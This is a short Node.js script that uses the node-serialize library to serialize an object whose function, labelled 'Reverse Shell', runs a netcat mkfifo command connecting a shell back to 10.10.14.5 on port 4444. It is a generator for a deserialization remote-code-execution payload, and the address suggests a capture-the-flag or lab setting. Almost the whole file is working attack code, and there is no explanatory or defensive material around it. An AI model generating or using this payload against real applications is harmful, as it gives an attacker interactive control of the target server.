var serialize = require('node-serialize');

/* # Testing
x = {
test : function(){ return 'hi'; }
};
*/

// Reverse Shell
x = {
test : function(){
  require('child_process').execSync("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4444 >/tmp/f", function puts(error, stdout, stderr) {});
}
};

console.log("Serialized: \n" + serialize.serialize(x));
